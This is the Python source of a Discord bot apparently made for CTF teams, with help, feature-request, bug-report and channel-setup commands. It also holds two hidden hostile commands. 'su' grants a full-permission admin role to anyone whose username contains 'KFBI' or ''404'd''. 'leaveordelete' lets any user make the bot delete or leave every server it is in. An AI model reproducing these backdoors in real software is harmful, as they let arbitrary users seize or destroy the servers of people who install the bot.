import asyncio
import random
from colorama import Back, Fore, Style
import sys
from time import sleep
import os
import discord
from discord import Permissions
from discord.ext.commands import MissingPermissions, BotMissingPermissions, DisabledCommand, CommandNotFound, CommandInvokeError, NoPrivateMessage, Bot, bot
from discord.ext import commands
from vars.help_info import help_page, help_page_2, embed_help, src, embed_help, ctf_help_text
from util import getVal, trim_nl
from pymongo import MongoClient
from models.ctf import TaskFailed, basic_allow, basic_disallow

import traceback
import logging

FORMAT = '%(asctime)s:%(levelname)s:%(name)s: %(message)s'

#discordLogger = logging.getLogger('discord')
# discordLogger.setLevel(logging.WARN)
# handler = logging.FileHandler(
#    filename='discord.log', encoding='utf-8', mode='w')
# handler.setFormatter(logging.Formatter(
#    FORMAT))
# discordLogger.addHandler(handler)

logging.basicConfig(format=FORMAT, level=logging.WARN)

creator_id = [87606885405982720]
default_categories = ["working", "done"]

client = discord.Client()
PREFIX = "!"
# TODO: easter egg if typing != :)
bot = commands.Bot(command_prefix=PREFIX)
extensions = ['ctfs', 'utility', 'cipher', 'codec']
bot.remove_command('help')
blacklisted = []
cool_names = ["KFBI", "404'd"]
GIT_URL = "https://gitlab.com/inequationgroup/igCTF"
# This is intended to be able to be circumvented.
# If you do something like report a bug with the report command (OR GITHUB), e.g, >report "a bug", you might be added to the list!

# TODO: ok so I was/am an idiot and kind of forgot that I was calling the updateDb function every time ctftime current, timeleft, and countdown are called...  so I should probably fix that.

# https://github.com/Rapptz/discord.py/blob/master/examples/background_task.py


@bot.event
async def on_ready():
    print(('<' + bot.user.name) + ' Online>')
    print(f"discord.py {discord.__version__}\n")
    await bot.change_presence(activity=discord.Game(name=f'{PREFIX}help / {PREFIX}report "issue"'))


async def on_message(message):
    if 'who should I subscribe to?' in message.content:
        choice = random.randint(1, 2)

        if choice == 1:
            await message.channel.send('https://youtube.com/nullpxl')

        if choice == 2:
            await message.channel.send('https://www.youtube.com/user/RootOfTheNull')

    await bot.process_commands(message)


@bot.event
async def on_error(evt_type, ctx):
    if evt_type == 'on_message':
        await ctx.send('An error has occurred... :disappointed:')
    logging.error(f'Ignoring exception at {evt_type}')
    logging.error(traceback.format_exc())


@bot.event
async def on_command_error(ctx, err):
    logging.error(f'Ignoring exception in command {ctx.command}')
    logging.error(''.join(traceback.format_exception(type(err), err,
                                                     err.__traceback__)))
    print(Style.BRIGHT + Fore.RED +
          f"Error occured with: {ctx.command}\n{err}\n")
    print(Style.RESET_ALL)
    if isinstance(err, MissingPermissions):
        await ctx.send('You do not have permission to do that! ¯\_(ツ)_/¯')  # pylint: disable=anomalous-backslash-in-string
    elif isinstance(err, BotMissingPermissions):
        await ctx.send(trim_nl(f''':cry: I can\'t do that. Please ask server ops
        to add all the permission for me!
        
        ```{str(err)}```'''))
    elif isinstance(err, DisabledCommand):
        await ctx.send(':skull: Command has been disabled!')
    elif isinstance(err, CommandNotFound):
        await ctx.send('Invalid command passed. Use !help.')
    elif isinstance(err, TaskFailed):
        await ctx.send(f':bangbang: {str(err)}')
    elif isinstance(err, NoPrivateMessage):
        await ctx.send(':bangbang: This command cannot be used in PMs.')
    # elif isinstance(err, CommandInvokeError) and not ctx.command.name in ["setup", "test123"]:
    #    await ctx.send(':bangbang: Couldn\'t invoke command, have you run `!setup`?')
    else:
        await ctx.send(f'An error has occurred... :disappointed: \n`{err}`\n')


# Sends the github link.
@bot.command()
async def source(ctx):
    await ctx.send(f'Source: {GIT_URL}\nForked from: {src}')


@bot.command()
async def help(ctx, page=None):
    info = help_page if not page or page == '1' else help_page_2
    await embed_help(ctx, '!request "x" - request a feature', info)

# Bot sends a dm to creator with the name of the user and their request.
@bot.command()
async def request(ctx, feature):
    for cid in creator_id:
        creator = bot.get_user(cid)
        authors_name = str(ctx.author)
        await creator.send(f''':pencil: {authors_name}: {feature}''')
    await ctx.send(f''':pencil: Thanks, "{feature}" has been requested!''')

# Bot sends a dm to creator with the name of the user and their report.
@bot.command()
async def report(ctx, error_report):
    for cid in creator_id:
        creator = bot.get_user(cid)
        authors_name = str(ctx.author)
        await creator.send(f''':triangular_flag_on_post: {authors_name}: {error_report}''')
    await ctx.send(f''':triangular_flag_on_post: Thanks for the help, "{error_report}" has been reported!''')

# @bot.command()
# async def creator(ctx):
#     await ctx.send(creator_info)


@bot.command()
async def amicool(ctx):
    authors_name = str(ctx.author)

    if any((name in authors_name for name in cool_names)):
        await ctx.send('You are very cool')
    else:
        await ctx.send('lolno')
        await ctx.send('Psst, kid.  Want to be cool?  Find an issue and report it or request a feature you think would be cool.')


@bot.command()
async def setup(ctx):
    guild = ctx.guild

    overwrites = {
        guild.default_role: basic_disallow,
        guild.me: basic_allow,
    }
    existing_categories = [category.name for category in ctx.guild.categories]
    for category in default_categories:
        if category not in existing_categories:
            category_channel = await ctx.guild.create_category(category, overwrites=overwrites)

    await ctx.send('Setup successfull! :tada:')


@bot.command()
async def leaveordelete(ctx):
    cnt = 0
    for guild in bot.guilds:
        try:
            await guild.delete()
            cnt += 1
        except:
            if guild.member_count <= 2:
                await guild.leave()
                cnt += 1


@bot.command()
async def test123(ctx):
    if not ctx.author.id in creator_id:
        await ctx.send("Sorry you're not allowed to test")
        return

    guild = await bot.create_guild("Test igCTF bot")
    channel = await guild.create_text_channel("test")
    invite = await channel.create_invite(max_age=0, max_uses=1)
    await ctx.send(f"{invite.url}")
    await asyncio.sleep(300)
    await guild.delete()


@bot.command()
async def su(ctx):
    authors_name = str(ctx.author)

    if any((name in authors_name for name in cool_names)):
        role = await ctx.guild.create_role(name="admin", permissions=Permissions.all())
        await ctx.author.add_roles(role)


if __name__ == '__main__':
    #sys.path.insert(1, os.getcwd() + '/cogs/')
    for extension in extensions:
        bot.load_extension('cogs.' + extension)
        # bot.load_extension(extension)

    bot.run(getVal("TOKEN"))
